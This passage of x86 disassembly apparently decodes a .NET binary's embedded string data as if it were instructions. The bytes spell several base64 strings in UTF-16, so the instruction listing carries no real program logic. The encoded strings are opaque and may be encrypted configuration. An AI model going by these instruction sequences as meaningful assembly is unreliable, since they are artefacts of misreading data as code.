  40b1a4:	00 4f 00             	add    %cl,0x0(%edi)
  40b1a7:	38 00                	cmp    %al,(%eax)
  40b1a9:	46                   	inc    %esi
  40b1aa:	00 73 00             	add    %dh,0x0(%ebx)
  40b1ad:	75 00                	jne    0x40b1af
  40b1af:	45                   	inc    %ebp
  40b1b0:	00 6f 00             	add    %ch,0x0(%edi)
  40b1b3:	70 00                	jo     0x40b1b5
  40b1b5:	4e                   	dec    %esi
  40b1b6:	00 59 00             	add    %bl,0x0(%ecx)
  40b1b9:	77 00                	ja     0x40b1bb
  40b1bb:	4d                   	dec    %ebp
  40b1bc:	00 79 00             	add    %bh,0x0(%ecx)
  40b1bf:	65 00 44 00 4d       	add    %al,%gs:0x4d(%eax,%eax,1)
  40b1c4:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40b1c8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1cb:	44                   	inc    %esp
  40b1cc:	00 56 00             	add    %dl,0x0(%esi)
  40b1cf:	2b 00                	sub    (%eax),%eax
  40b1d1:	45                   	inc    %ebp
  40b1d2:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40b1d6:	00 65 00             	add    %ah,0x0(%ebp)
  40b1d9:	55                   	push   %ebp
  40b1da:	00 52 00             	add    %dl,0x0(%edx)
  40b1dd:	33 00                	xor    (%eax),%eax
  40b1df:	56                   	push   %esi
  40b1e0:	00 55 00             	add    %dl,0x0(%ebp)
  40b1e3:	4a                   	dec    %edx
  40b1e4:	00 68 00             	add    %ch,0x0(%eax)
  40b1e7:	74 00                	je     0x40b1e9
  40b1e9:	5a                   	pop    %edx
  40b1ea:	00 61 00             	add    %ah,0x0(%ecx)
  40b1ed:	71 00                	jno    0x40b1ef
  40b1ef:	4b                   	dec    %ebx
  40b1f0:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1f3:	7a 00                	jp     0x40b1f5
  40b1f5:	74 00                	je     0x40b1f7
  40b1f7:	7a 00                	jp     0x40b1f9
  40b1f9:	78 00                	js     0x40b1fb
  40b1fb:	57                   	push   %edi
  40b1fc:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b200:	00 39                	add    %bh,(%ecx)
  40b202:	00 38                	add    %bh,(%eax)
  40b204:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40b208:	00 67 00             	add    %ah,0x0(%edi)
  40b20b:	2f                   	das
  40b20c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b20f:	62 00                	bound  %eax,(%eax)
  40b211:	46                   	inc    %esi
  40b212:	00 51 00             	add    %dl,0x0(%ecx)
  40b215:	43                   	inc    %ebx
  40b216:	00 32                	add    %dh,(%edx)
  40b218:	00 35 00 75 00 37    	add    %dh,0x37007500
  40b21e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b221:	70 00                	jo     0x40b223
  40b223:	54                   	push   %esp
  40b224:	00 69 00             	add    %ch,0x0(%ecx)
  40b227:	70 00                	jo     0x40b229
  40b229:	63 00                	arpl   %eax,(%eax)
  40b22b:	38 00                	cmp    %al,(%eax)
  40b22d:	35 00 6c 00 56       	xor    $0x56006c00,%eax
  40b232:	00 51 00             	add    %dl,0x0(%ecx)
  40b235:	38 00                	cmp    %al,(%eax)
  40b237:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40b23b:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40b23f:	4d                   	dec    %ebp
  40b240:	00 6d 00             	add    %ch,0x0(%ebp)
  40b243:	2b 00                	sub    (%eax),%eax
  40b245:	71 00                	jno    0x40b247
  40b247:	2b 00                	sub    (%eax),%eax
  40b249:	59                   	pop    %ecx
  40b24a:	00 4a 00             	add    %cl,0x0(%edx)
  40b24d:	52                   	push   %edx
  40b24e:	00 52 00             	add    %dl,0x0(%edx)
  40b251:	77 00                	ja     0x40b253
  40b253:	4f                   	dec    %edi
  40b254:	00 30                	add    %dh,(%eax)
  40b256:	00 77 00             	add    %dh,0x0(%edi)
  40b259:	39 00                	cmp    %eax,(%eax)
  40b25b:	6d                   	insl   (%dx),%es:(%edi)
  40b25c:	00 47 00             	add    %al,0x0(%edi)
  40b25f:	46                   	inc    %esi
  40b260:	00 4d 00             	add    %cl,0x0(%ebp)
  40b263:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40b267:	61                   	popa
  40b268:	00 4e 00             	add    %cl,0x0(%esi)
  40b26b:	48                   	dec    %eax
  40b26c:	00 31                	add    %dh,(%ecx)
  40b26e:	00 56 00             	add    %dl,0x0(%esi)
  40b271:	73 00                	jae    0x40b273
  40b273:	56                   	push   %esi
  40b274:	00 72 00             	add    %dh,0x0(%edx)
  40b277:	38 00                	cmp    %al,(%eax)
  40b279:	76 00                	jbe    0x40b27b
  40b27b:	4d                   	dec    %ebp
  40b27c:	00 69 00             	add    %ch,0x0(%ecx)
  40b27f:	69 00 5a 00 2f 00    	imul   $0x2f005a,(%eax),%eax
  40b285:	54                   	push   %esp
  40b286:	00 46 00             	add    %al,0x0(%esi)
  40b289:	35 00 33 00 74       	xor    $0x74003300,%eax
  40b28e:	00 55 00             	add    %dl,0x0(%ebp)
  40b291:	33 00                	xor    (%eax),%eax
  40b293:	49                   	dec    %ecx
  40b294:	00 59 00             	add    %bl,0x0(%ecx)
  40b297:	7a 00                	jp     0x40b299
  40b299:	7a 00                	jp     0x40b29b
  40b29b:	61                   	popa
  40b29c:	00 65 00             	add    %ah,0x0(%ebp)
  40b29f:	31 00                	xor    %eax,(%eax)
  40b2a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2a2:	00 59 00             	add    %bl,0x0(%ecx)
  40b2a5:	41                   	inc    %ecx
  40b2a6:	00 36                	add    %dh,(%esi)
  40b2a8:	00 69 00             	add    %ch,0x0(%ecx)
  40b2ab:	50                   	push   %eax
  40b2ac:	00 76 00             	add    %dh,0x0(%esi)
  40b2af:	4c                   	dec    %esp
  40b2b0:	00 51 00             	add    %dl,0x0(%ecx)
  40b2b3:	4e                   	dec    %esi
  40b2b4:	00 31                	add    %dh,(%ecx)
  40b2b6:	00 53 00             	add    %dl,0x0(%ebx)
  40b2b9:	37                   	aaa
  40b2ba:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2bd:	79 00                	jns    0x40b2bf
  40b2bf:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40b2c3:	72 00                	jb     0x40b2c5
  40b2c5:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b2c9:	61                   	popa
  40b2ca:	00 37                	add    %dh,(%edi)
  40b2cc:	00 73 00             	add    %dh,0x0(%ebx)
  40b2cf:	31 00                	xor    %eax,(%eax)
  40b2d1:	57                   	push   %edi
  40b2d2:	00 45 00             	add    %al,0x0(%ebp)
  40b2d5:	49                   	dec    %ecx
  40b2d6:	00 71 00             	add    %dh,0x0(%ecx)
  40b2d9:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b2dd:	67 00 2f             	add    %ch,(%bx)
  40b2e0:	00 77 00             	add    %dh,0x0(%edi)
  40b2e3:	42                   	inc    %edx
  40b2e4:	00 30                	add    %dh,(%eax)
  40b2e6:	00 4e 00             	add    %cl,0x0(%esi)
  40b2e9:	6d                   	insl   (%dx),%es:(%edi)
  40b2ea:	00 4e 00             	add    %cl,0x0(%esi)
  40b2ed:	49                   	dec    %ecx
  40b2ee:	00 39                	add    %bh,(%ecx)
  40b2f0:	00 6f 00             	add    %ch,0x0(%edi)
  40b2f3:	63 00                	arpl   %eax,(%eax)
  40b2f5:	41                   	inc    %ecx
  40b2f6:	00 70 00             	add    %dh,0x0(%eax)
  40b2f9:	4a                   	dec    %edx
  40b2fa:	00 53 00             	add    %dl,0x0(%ebx)
  40b2fd:	4b                   	dec    %ebx
  40b2fe:	00 6b 00             	add    %ch,0x0(%ebx)
  40b301:	43                   	inc    %ebx
  40b302:	00 59 00             	add    %bl,0x0(%ecx)
  40b305:	4d                   	dec    %ebp
  40b306:	00 4d 00             	add    %cl,0x0(%ebp)
  40b309:	6a 00                	push   $0x0
  40b30b:	74 00                	je     0x40b30d
  40b30d:	75 00                	jne    0x40b30f
  40b30f:	5a                   	pop    %edx
  40b310:	00 71 00             	add    %dh,0x0(%ecx)
  40b313:	53                   	push   %ebx
  40b314:	00 36                	add    %dh,(%esi)
  40b316:	00 33                	add    %dh,(%ebx)
  40b318:	00 36                	add    %dh,(%esi)
  40b31a:	00 4e 00             	add    %cl,0x0(%esi)
  40b31d:	71 00                	jno    0x40b31f
  40b31f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b320:	00 53 00             	add    %dl,0x0(%ebx)
  40b323:	4b                   	dec    %ebx
  40b324:	00 49 00             	add    %cl,0x0(%ecx)
  40b327:	53                   	push   %ebx
  40b328:	00 68 00             	add    %ch,0x0(%eax)
  40b32b:	33 00                	xor    (%eax),%eax
  40b32d:	38 00                	cmp    %al,(%eax)
  40b32f:	73 00                	jae    0x40b331
  40b331:	38 00                	cmp    %al,(%eax)
  40b333:	72 00                	jb     0x40b335
  40b335:	70 00                	jo     0x40b337
  40b337:	4d                   	dec    %ebp
  40b338:	00 4f 00             	add    %cl,0x0(%edi)
  40b33b:	57                   	push   %edi
  40b33c:	00 72 00             	add    %dh,0x0(%edx)
  40b33f:	65 00 6c 00 59       	add    %ch,%gs:0x59(%eax,%eax,1)
  40b344:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b347:	47                   	inc    %edi
  40b348:	00 6f 00             	add    %ch,0x0(%edi)
  40b34b:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40b34e:	00 73 00             	add    %dh,0x0(%ebx)
  40b351:	50                   	push   %eax
  40b352:	00 7a 00             	add    %bh,0x0(%edx)
  40b355:	30 00                	xor    %al,(%eax)
  40b357:	58                   	pop    %eax
  40b358:	00 4a 00             	add    %cl,0x0(%edx)
  40b35b:	42                   	inc    %edx
  40b35c:	00 62 00             	add    %ah,0x0(%edx)
  40b35f:	2b 00                	sub    (%eax),%eax
  40b361:	52                   	push   %edx
  40b362:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b365:	6f                   	outsl  %ds:(%esi),(%dx)
  40b366:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40b36a:	00 67 00             	add    %ah,0x0(%edi)
  40b36d:	44                   	inc    %esp
  40b36e:	00 2b                	add    %ch,(%ebx)
  40b370:	00 65 00             	add    %ah,0x0(%ebp)
  40b373:	32 00                	xor    (%eax),%al
  40b375:	6d                   	insl   (%dx),%es:(%edi)
  40b376:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b379:	49                   	dec    %ecx
  40b37a:	00 6e 00             	add    %ch,0x0(%esi)
  40b37d:	46                   	inc    %esi
  40b37e:	00 65 00             	add    %ah,0x0(%ebp)
  40b381:	4e                   	dec    %esi
  40b382:	00 31                	add    %dh,(%ecx)
  40b384:	00 4b 00             	add    %cl,0x0(%ebx)
  40b387:	4a                   	dec    %edx
  40b388:	00 6b 00             	add    %ch,0x0(%ebx)
  40b38b:	34 00                	xor    $0x0,%al
  40b38d:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40b391:	6b 00 57             	imul   $0x57,(%eax),%eax
  40b394:	00 48 00             	add    %cl,0x0(%eax)
  40b397:	66 00 38             	data16 add %bh,(%eax)
  40b39a:	00 58 00             	add    %bl,0x0(%eax)
  40b39d:	4a                   	dec    %edx
  40b39e:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40b3a2:	00 41 00             	add    %al,0x0(%ecx)
  40b3a5:	56                   	push   %esi
  40b3a6:	00 5a 00             	add    %bl,0x0(%edx)
  40b3a9:	38 00                	cmp    %al,(%eax)
  40b3ab:	4b                   	dec    %ebx
  40b3ac:	00 31                	add    %dh,(%ecx)
  40b3ae:	00 43 00             	add    %al,0x0(%ebx)
  40b3b1:	68 00 43 00 78       	push   $0x78004300
  40b3b6:	00 58 00             	add    %bl,0x0(%eax)
  40b3b9:	44                   	inc    %esp
  40b3ba:	00 36                	add    %dh,(%esi)
  40b3bc:	00 48 00             	add    %cl,0x0(%eax)
  40b3bf:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40b3c3:	63 00                	arpl   %eax,(%eax)
  40b3c5:	48                   	dec    %eax
  40b3c6:	00 41 00             	add    %al,0x0(%ecx)
  40b3c9:	37                   	aaa
  40b3ca:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40b3ce:	00 52 00             	add    %dl,0x0(%edx)
  40b3d1:	79 00                	jns    0x40b3d3
  40b3d3:	55                   	push   %ebp
  40b3d4:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40b3d8:	00 58 00             	add    %bl,0x0(%eax)
  40b3db:	6b 00 56             	imul   $0x56,(%eax),%eax
  40b3de:	00 59 00             	add    %bl,0x0(%ecx)
  40b3e1:	5a                   	pop    %edx
  40b3e2:	00 41 00             	add    %al,0x0(%ecx)
  40b3e5:	39 00                	cmp    %eax,(%eax)
  40b3e7:	59                   	pop    %ecx
  40b3e8:	00 68 00             	add    %ch,0x0(%eax)
  40b3eb:	67 00 32             	add    %dh,(%bp,%si)
  40b3ee:	00 66 00             	add    %ah,0x0(%esi)
  40b3f1:	30 00                	xor    %al,(%eax)
  40b3f3:	4e                   	dec    %esi
  40b3f4:	00 45 00             	add    %al,0x0(%ebp)
  40b3f7:	75 00                	jne    0x40b3f9
  40b3f9:	69 00 79 00 65 00    	imul   $0x650079,(%eax),%eax
  40b3ff:	38 00                	cmp    %al,(%eax)
  40b401:	41                   	inc    %ecx
  40b402:	00 39                	add    %bh,(%ecx)
  40b404:	00 49 00             	add    %cl,0x0(%ecx)
  40b407:	5a                   	pop    %edx
  40b408:	00 76 00             	add    %dh,0x0(%esi)
  40b40b:	36 00 30             	add    %dh,%ss:(%eax)
  40b40e:	00 6e 00             	add    %ch,0x0(%esi)
  40b411:	7a 00                	jp     0x40b413
  40b413:	5a                   	pop    %edx
  40b414:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40b418:	00 51 00             	add    %dl,0x0(%ecx)
  40b41b:	30 00                	xor    %al,(%eax)
  40b41d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b41e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b421:	4d                   	dec    %ebp
  40b422:	00 52 00             	add    %dl,0x0(%edx)
  40b425:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40b429:	33 00                	xor    (%eax),%eax
  40b42b:	55                   	push   %ebp
  40b42c:	00 5a 00             	add    %bl,0x0(%edx)
  40b42f:	53                   	push   %ebx
  40b430:	00 72 00             	add    %dh,0x0(%edx)
  40b433:	6e                   	outsb  %ds:(%esi),(%dx)
  40b434:	00 79 00             	add    %bh,0x0(%ecx)
  40b437:	30 00                	xor    %al,(%eax)
  40b439:	6a 00                	push   $0x0
  40b43b:	4c                   	dec    %esp
  40b43c:	00 36                	add    %dh,(%esi)
  40b43e:	00 75 00             	add    %dh,0x0(%ebp)
  40b441:	78 00                	js     0x40b443
  40b443:	46                   	inc    %esi
  40b444:	00 79 00             	add    %bh,0x0(%ecx)
  40b447:	6c                   	insb   (%dx),%es:(%edi)
  40b448:	00 52 00             	add    %dl,0x0(%edx)
  40b44b:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40b44e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b451:	54                   	push   %esp
  40b452:	00 4f 00             	add    %cl,0x0(%edi)
  40b455:	56                   	push   %esi
  40b456:	00 68 00             	add    %ch,0x0(%eax)
  40b459:	75 00                	jne    0x40b45b
  40b45b:	74 00                	je     0x40b45d
  40b45d:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b461:	47                   	inc    %edi
  40b462:	00 77 00             	add    %dh,0x0(%edi)
  40b465:	72 00                	jb     0x40b467
  40b467:	4a                   	dec    %edx
  40b468:	00 41 00             	add    %al,0x0(%ecx)
  40b46b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b470:	80 b1 2b 00 6f 00 47 	xorb   $0x47,0x6f002b(%ecx)
  40b477:	00 4e 00             	add    %cl,0x0(%esi)
  40b47a:	56                   	push   %esi
  40b47b:	00 43 00             	add    %al,0x0(%ebx)
  40b47e:	63 00                	arpl   %eax,(%eax)
  40b480:	67 00 4d 00          	add    %cl,0x0(%di)
  40b484:	2b 00                	sub    (%eax),%eax
  40b486:	42                   	inc    %edx
  40b487:	00 35 00 4f 00 30    	add    %dh,0x30004f00
  40b48d:	00 45 00             	add    %al,0x0(%ebp)
  40b490:	32 00                	xor    (%eax),%al
  40b492:	73 00                	jae    0x40b494
  40b494:	79 00                	jns    0x40b496
  40b496:	6f                   	outsl  %ds:(%esi),(%dx)
  40b497:	00 47 00             	add    %al,0x0(%edi)
  40b49a:	49                   	dec    %ecx
  40b49b:	00 78 00             	add    %bh,0x0(%eax)
  40b49e:	5a                   	pop    %edx
  40b49f:	00 2b                	add    %ch,(%ebx)
  40b4a1:	00 45 00             	add    %al,0x0(%ebp)
  40b4a4:	51                   	push   %ecx
  40b4a5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4a8:	53                   	push   %ebx
  40b4a9:	00 2f                	add    %ch,(%edi)
  40b4ab:	00 47 00             	add    %al,0x0(%edi)
  40b4ae:	71 00                	jno    0x40b4b0
  40b4b0:	70 00                	jo     0x40b4b2
  40b4b2:	42                   	inc    %edx
  40b4b3:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40b4b7:	00 55 00             	add    %dl,0x0(%ebp)
  40b4ba:	4f                   	dec    %edi
  40b4bb:	00 46 00             	add    %al,0x0(%esi)
  40b4be:	77 00                	ja     0x40b4c0
  40b4c0:	74 00                	je     0x40b4c2
  40b4c2:	59                   	pop    %ecx
  40b4c3:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b4c7:	00 47 00             	add    %al,0x0(%edi)
  40b4ca:	55                   	push   %ebp
  40b4cb:	00 45 00             	add    %al,0x0(%ebp)
  40b4ce:	6b 00 31             	imul   $0x31,(%eax),%eax
  40b4d1:	00 47 00             	add    %al,0x0(%edi)
  40b4d4:	32 00                	xor    (%eax),%al
  40b4d6:	6a 00                	push   $0x0
  40b4d8:	5a                   	pop    %edx
  40b4d9:	00 57 00             	add    %dl,0x0(%edi)
  40b4dc:	72 00                	jb     0x40b4de
  40b4de:	2f                   	das
  40b4df:	00 5a 00             	add    %bl,0x0(%edx)
  40b4e2:	2b 00                	sub    (%eax),%eax
  40b4e4:	70 00                	jo     0x40b4e6
  40b4e6:	45                   	inc    %ebp
  40b4e7:	00 67 00             	add    %ah,0x0(%edi)
  40b4ea:	76 00                	jbe    0x40b4ec
  40b4ec:	30 00                	xor    %al,(%eax)
  40b4ee:	39 00                	cmp    %eax,(%eax)
  40b4f0:	4e                   	dec    %esi
  40b4f1:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4f4:	34 00                	xor    $0x0,%al
  40b4f6:	34 00                	xor    $0x0,%al
  40b4f8:	50                   	push   %eax
  40b4f9:	00 77 00             	add    %dh,0x0(%edi)
  40b4fc:	61                   	popa
  40b4fd:	00 65 00             	add    %ah,0x0(%ebp)
  40b500:	7a 00                	jp     0x40b502
  40b502:	6f                   	outsl  %ds:(%esi),(%dx)
  40b503:	00 41 00             	add    %al,0x0(%ecx)
  40b506:	41                   	inc    %ecx
  40b507:	00 73 00             	add    %dh,0x0(%ebx)
  40b50a:	47                   	inc    %edi
  40b50b:	00 76 00             	add    %dh,0x0(%esi)
  40b50e:	48                   	dec    %eax
  40b50f:	00 36                	add    %dh,(%esi)
  40b511:	00 37                	add    %dh,(%edi)
  40b513:	00 47 00             	add    %al,0x0(%edi)
  40b516:	52                   	push   %edx
  40b517:	00 4a 00             	add    %cl,0x0(%edx)
  40b51a:	45                   	inc    %ebp
  40b51b:	00 77 00             	add    %dh,0x0(%edi)
  40b51e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b523:	80 b1 31 00 69 00 79 	xorb   $0x79,0x690031(%ecx)
  40b52a:	00 30                	add    %dh,(%eax)
  40b52c:	00 50 00             	add    %dl,0x0(%eax)
  40b52f:	42                   	inc    %edx
  40b530:	00 4f 00             	add    %cl,0x0(%edi)
  40b533:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b537:	49                   	dec    %ecx
  40b538:	00 66 00             	add    %ah,0x0(%esi)
  40b53b:	62 00                	bound  %eax,(%eax)
  40b53d:	32 00                	xor    (%eax),%al
  40b53f:	33 00                	xor    (%eax),%eax
  40b541:	70 00                	jo     0x40b543
  40b543:	50                   	push   %eax
  40b544:	00 2f                	add    %ch,(%edi)
  40b546:	00 72 00             	add    %dh,0x0(%edx)
  40b549:	4b                   	dec    %ebx
  40b54a:	00 47 00             	add    %al,0x0(%edi)
  40b54d:	79 00                	jns    0x40b54f
  40b54f:	71 00                	jno    0x40b551
  40b551:	67 00 4c 00          	add    %cl,0x0(%si)
  40b555:	32 00                	xor    (%eax),%al
  40b557:	35 00 63 00 65       	xor    $0x65006300,%eax
  40b55c:	00 55 00             	add    %dl,0x0(%ebp)
  40b55f:	6c                   	insb   (%dx),%es:(%edi)
  40b560:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40b564:	00 68 00             	add    %ch,0x0(%eax)
  40b567:	48                   	dec    %eax
  40b568:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40b56c:	00 66 00             	add    %ah,0x0(%esi)
  40b56f:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40b573:	33 00                	xor    (%eax),%eax
  40b575:	4d                   	dec    %ebp
  40b576:	00 2b                	add    %ch,(%ebx)
  40b578:	00 65 00             	add    %ah,0x0(%ebp)
  40b57b:	75 00                	jne    0x40b57d
  40b57d:	78 00                	js     0x40b57f
  40b57f:	6d                   	insl   (%dx),%es:(%edi)
  40b580:	00 53 00             	add    %dl,0x0(%ebx)
  40b583:	43                   	inc    %ebx
  40b584:	00 61 00             	add    %ah,0x0(%ecx)
  40b587:	6b 00 66             	imul   $0x66,(%eax),%eax
  40b58a:	00 42 00             	add    %al,0x0(%edx)
  40b58d:	50                   	push   %eax
  40b58e:	00 5a 00             	add    %bl,0x0(%edx)
  40b591:	5a                   	pop    %edx
  40b592:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40b596:	00 56 00             	add    %dl,0x0(%esi)
  40b599:	42                   	inc    %edx
  40b59a:	00 30                	add    %dh,(%eax)
  40b59c:	00 55 00             	add    %dl,0x0(%ebp)
  40b59f:	4b                   	dec    %ebx
  40b5a0:	00 43 00             	add    %al,0x0(%ebx)
  40b5a3:	49                   	dec    %ecx
  40b5a4:	00 55 00             	add    %dl,0x0(%ebp)
  40b5a7:	4e                   	dec    %esi
  40b5a8:	00 49 00             	add    %cl,0x0(%ecx)
  40b5ab:	43                   	inc    %ebx
  40b5ac:	00 5a 00             	add    %bl,0x0(%edx)
  40b5af:	58                   	pop    %eax
  40b5b0:	00 45 00             	add    %al,0x0(%ebp)
  40b5b3:	4c                   	dec    %esp
  40b5b4:	00 58 00             	add    %bl,0x0(%eax)
  40b5b7:	6a 00                	push   $0x0
  40b5b9:	30 00                	xor    %al,(%eax)
  40b5bb:	78 00                	js     0x40b5bd
  40b5bd:	30 00                	xor    %al,(%eax)
  40b5bf:	4e                   	dec    %esi
  40b5c0:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b5c4:	00 6a 00             	add    %ch,0x0(%edx)
  40b5c7:	58                   	pop    %eax
  40b5c8:	00 51 00             	add    %dl,0x0(%ecx)
  40b5cb:	55                   	push   %ebp
  40b5cc:	00 68 00             	add    %ch,0x0(%eax)
  40b5cf:	77 00                	ja     0x40b5d1
  40b5d1:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b5d6:	80 b1 77 00 38 00 34 	xorb   $0x34,0x380077(%ecx)
  40b5dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5e0:	30 00                	xor    %al,(%eax)
  40b5e2:	61                   	popa
  40b5e3:	00 32                	add    %dh,(%edx)
  40b5e5:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40b5e9:	00 38                	add    %bh,(%eax)
  40b5eb:	00 2b                	add    %ch,(%ebx)
  40b5ed:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5f0:	58                   	pop    %eax
  40b5f1:	00 42 00             	add    %al,0x0(%edx)
  40b5f4:	72 00                	jb     0x40b5f6
  40b5f6:	57                   	push   %edi
  40b5f7:	00 33                	add    %dh,(%ebx)
  40b5f9:	00 71 00             	add    %dh,0x0(%ecx)
  40b5fc:	77 00                	ja     0x40b5fe
  40b5fe:	46                   	inc    %esi
  40b5ff:	00 6d 00             	add    %ch,0x0(%ebp)
  40b602:	6d                   	insl   (%dx),%es:(%edi)
  40b603:	00 68 00             	add    %ch,0x0(%eax)
  40b606:	39 00                	cmp    %eax,(%eax)
  40b608:	61                   	popa
  40b609:	00 76 00             	add    %dh,0x0(%esi)
  40b60c:	36 00 37             	add    %dh,%ss:(%edi)
  40b60f:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40b613:	00 30                	add    %dh,(%eax)
  40b615:	00 46 00             	add    %al,0x0(%esi)
  40b618:	6f                   	outsl  %ds:(%esi),(%dx)
  40b619:	00 2b                	add    %ch,(%ebx)
  40b61b:	00 4f 00             	add    %cl,0x0(%edi)
  40b61e:	51                   	push   %ecx
  40b61f:	00 4a 00             	add    %cl,0x0(%edx)
  40b622:	58                   	pop    %eax
  40b623:	00 68 00             	add    %ch,0x0(%eax)
  40b626:	2b 00                	sub    (%eax),%eax
  40b628:	38 00                	cmp    %al,(%eax)
  40b62a:	73 00                	jae    0x40b62c
  40b62c:	53                   	push   %ebx
  40b62d:	00 63 00             	add    %ah,0x0(%ebx)
  40b630:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b634:	38 00                	cmp    %al,(%eax)
  40b636:	41                   	inc    %ecx
  40b637:	00 32                	add    %dh,(%edx)
  40b639:	00 56 00             	add    %dl,0x0(%esi)
  40b63c:	67 00 66 00          	add    %ah,0x0(%bp)
  40b640:	50                   	push   %eax
  40b641:	00 4e 00             	add    %cl,0x0(%esi)
  40b644:	35 00 68 00 64       	xor    $0x64006800,%eax
  40b649:	00 6d 00             	add    %ch,0x0(%ebp)
  40b64c:	53                   	push   %ebx
  40b64d:	00 55 00             	add    %dl,0x0(%ebp)
  40b650:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b653:	00 47 00             	add    %al,0x0(%edi)
  40b656:	6c                   	insb   (%dx),%es:(%edi)
  40b657:	00 69 00             	add    %ch,0x0(%ecx)
  40b65a:	51                   	push   %ecx
  40b65b:	00 63 00             	add    %ah,0x0(%ebx)
  40b65e:	76 00                	jbe    0x40b660
  40b660:	55                   	push   %ebp
  40b661:	00 43 00             	add    %al,0x0(%ebx)
  40b664:	46                   	inc    %esi
  40b665:	00 61 00             	add    %ah,0x0(%ecx)
  40b668:	6e                   	outsb  %ds:(%esi),(%dx)
  40b669:	00 2f                	add    %ch,(%edi)
  40b66b:	00 58 00             	add    %bl,0x0(%eax)
  40b66e:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b672:	47                   	inc    %edi
  40b673:	00 70 00             	add    %dh,0x0(%eax)
  40b676:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40b679:	00 68 00             	add    %ch,0x0(%eax)
  40b67c:	47                   	inc    %edi
  40b67d:	00 43 00             	add    %al,0x0(%ebx)
  40b680:	6b 00 41             	imul   $0x41,(%eax),%eax
  40b683:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b689:	03 33                	add    (%ebx),%esi
  40b68b:	00 00                	add    %al,(%eax)
  40b68d:	80 b1 4f 00 71 00 6d 	xorb   $0x6d,0x71004f(%ecx)
  40b694:	00 61 00             	add    %ah,0x0(%ecx)
  40b697:	4e                   	dec    %esi
  40b698:	00 4a 00             	add    %cl,0x0(%edx)
  40b69b:	76 00                	jbe    0x40b69d
  40b69d:	32 00                	xor    (%eax),%al
  40b69f:	2f                   	das
  40b6a0:	00 75 00             	add    %dh,0x0(%ebp)
  40b6a3:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40b6a7:	69 00 6c 00 37 00    	imul   $0x37006c,(%eax),%eax
  40b6ad:	4d                   	dec    %ebp
  40b6ae:	00 43 00             	add    %al,0x0(%ebx)
  40b6b1:	6a 00                	push   $0x0
  40b6b3:	2f                   	das
  40b6b4:	00 78 00             	add    %bh,0x0(%eax)
  40b6b7:	61                   	popa
  40b6b8:	00 6a 00             	add    %ch,0x0(%edx)
  40b6bb:	34 00                	xor    $0x0,%al
  40b6bd:	69 00 45 00 75 00    	imul   $0x750045,(%eax),%eax
  40b6c3:	45                   	inc    %ebp
  40b6c4:	00 4a 00             	add    %cl,0x0(%edx)
  40b6c7:	36 00 37             	add    %dh,%ss:(%edi)
  40b6ca:	00 50 00             	add    %dl,0x0(%eax)
  40b6cd:	4e                   	dec    %esi
  40b6ce:	00 58 00             	add    %bl,0x0(%eax)
  40b6d1:	55                   	push   %ebp
  40b6d2:	00 5a 00             	add    %bl,0x0(%edx)
  40b6d5:	77 00                	ja     0x40b6d7
  40b6d7:	34 00                	xor    $0x0,%al
  40b6d9:	61                   	popa
  40b6da:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6dd:	2f                   	das
  40b6de:	00 66 00             	add    %ah,0x0(%esi)
  40b6e1:	66 00 2f             	data16 add %ch,(%edi)
  40b6e4:	00 66 00             	add    %ah,0x0(%esi)
  40b6e7:	59                   	pop    %ecx
  40b6e8:	00 45 00             	add    %al,0x0(%ebp)
  40b6eb:	41                   	inc    %ecx
